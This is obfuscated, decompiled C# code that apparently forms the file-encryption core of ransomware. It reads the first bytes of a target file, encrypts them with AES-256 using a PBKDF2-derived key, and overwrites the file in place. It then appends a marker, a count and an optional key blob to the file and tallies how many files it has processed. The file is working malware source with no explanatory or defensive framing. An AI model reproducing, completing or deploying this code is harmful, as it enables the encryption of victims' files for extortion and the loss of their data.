using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

public static class ZequaDafYiEEE
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] HmKdoaYIxt(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = zOLXifkIPiKdLH(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes zOLXifkIPiKdLH(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] OYFCIPVseFW(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (CRZFkRWzfSXjW.FTilkCJiPZSoYC == getString_0(107396959))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (CRZFkRWzfSXjW.VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(CRZFkRWzfSXjW.MGkBzYPheHDPb, getString_0(107386268) + string_0 + getString_0(107400882) + ex.Message + getString_0(107396430));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool CBMnRUrBOXPu(string rLBaDxrvUPxawf, byte[] KnotHgwphVB, byte[] bZjXaGuPypAlc = null)
	{
		try
		{
			byte[] array = null;
			if (CRZFkRWzfSXjW.FTilkCJiPZSoYC == getString_0(107396959))
			{
				array = (CRZFkRWzfSXjW.AcumuDDlRST ? Encoding.ASCII.GetBytes(CRZFkRWzfSXjW.wcGmwtolXpKf(CRZFkRWzfSXjW.ypzGMFIykfAhE) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400824)) + Convert.ToString(CRZFkRWzfSXjW.SHZkgBAmdkcxAL) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400824))) : Encoding.ASCII.GetBytes(CRZFkRWzfSXjW.wcGmwtolXpKf(CRZFkRWzfSXjW.ypzGMFIykfAhE) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400801)) + Convert.ToString(CRZFkRWzfSXjW.SHZkgBAmdkcxAL) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400801))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(rLBaDxrvUPxawf, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(KnotHgwphVB, 0, KnotHgwphVB.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(rLBaDxrvUPxawf, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!CRZFkRWzfSXjW.AcumuDDlRST)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(bZjXaGuPypAlc, 0, bZjXaGuPypAlc.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (CRZFkRWzfSXjW.AcumuDDlRST ? Encoding.ASCII.GetBytes(CRZFkRWzfSXjW.wcGmwtolXpKf(CRZFkRWzfSXjW.ypzGMFIykfAhE) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400824)) + Convert.ToString(CRZFkRWzfSXjW.SHZkgBAmdkcxAL) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400824))) : Encoding.ASCII.GetBytes(CRZFkRWzfSXjW.wcGmwtolXpKf(CRZFkRWzfSXjW.ypzGMFIykfAhE) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400801)) + Convert.ToString(CRZFkRWzfSXjW.SHZkgBAmdkcxAL) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400801))));
				FileStream fileStream2 = new FileStream(rLBaDxrvUPxawf, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(KnotHgwphVB, 0, KnotHgwphVB.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(rLBaDxrvUPxawf, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!CRZFkRWzfSXjW.AcumuDDlRST)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(bZjXaGuPypAlc, 0, bZjXaGuPypAlc.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			CRZFkRWzfSXjW.ywaYFjHsMFpWdbL++;
		}
		catch (Exception ex)
		{
			if (CRZFkRWzfSXjW.VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(CRZFkRWzfSXjW.MGkBzYPheHDPb, getString_0(107386268) + rLBaDxrvUPxawf + getString_0(107400815) + ex.Message + getString_0(107396430));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (CRZFkRWzfSXjW.AcumuDDlRST ? Encoding.ASCII.GetBytes(CRZFkRWzfSXjW.wcGmwtolXpKf(CRZFkRWzfSXjW.ypzGMFIykfAhE) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400824)) + Convert.ToString(CRZFkRWzfSXjW.SHZkgBAmdkcxAL) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400824))) : Encoding.ASCII.GetBytes(CRZFkRWzfSXjW.wcGmwtolXpKf(CRZFkRWzfSXjW.ypzGMFIykfAhE) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400801)) + Convert.ToString(CRZFkRWzfSXjW.SHZkgBAmdkcxAL) + CRZFkRWzfSXjW.wcGmwtolXpKf(getString_0(107400801))));
				FileStream fileStream4 = new FileStream(rLBaDxrvUPxawf, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(KnotHgwphVB, 0, KnotHgwphVB.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(rLBaDxrvUPxawf, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!CRZFkRWzfSXjW.AcumuDDlRST)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(bZjXaGuPypAlc, 0, bZjXaGuPypAlc.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static ZequaDafYiEEE()
	{
		Strings.CreateGetStringDelegate(typeof(ZequaDafYiEEE));
	}
}
